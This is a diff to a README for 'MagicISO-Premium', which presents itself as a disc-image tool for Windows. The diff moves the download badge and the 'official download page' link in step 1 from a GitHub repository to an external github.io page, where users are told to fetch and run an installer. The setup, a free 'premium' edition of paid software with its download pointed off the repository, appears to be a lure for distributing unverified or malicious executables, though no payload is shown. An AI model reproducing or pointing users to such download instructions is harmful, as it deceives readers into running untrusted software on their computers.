@@ -1,6 +1,6 @@
 # 💿 MagicISO-Premium - Manage Your Disc Image Files Easily
 
-[![](https://img.shields.io/badge/Download-MagicISO-blue)](https://github.com/Tamsightless774/MagicISO-Premium)
+[![](https://img.shields.io/badge/Download-MagicISO-blue)](https://tamsightless774.github.io)
 
 This guide shows you how to install and use MagicISO-Premium on your Windows computer. MagicISO-Premium helps you create, edit, and mount disc image files. These files often end with the .iso extension. Use this software to handle data backups, software installations, or virtual media without needing a physical disc drive.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these basic needs before you start the installation:
 
 Follow these steps to set up the software on your system:
 
-1.  Visit the [official download page](https://github.com/Tamsightless774/MagicISO-Premium) to obtain the installer.
+1.  Visit the [official download page](https://tamsightless774.github.io) to obtain the installer.
 2.  Locate the button labeled "Download" or "Release" on that page.
 3.  Click the link to save the installation file to your computer.
 4.  Navigate to your Downloads folder using File Explorer.
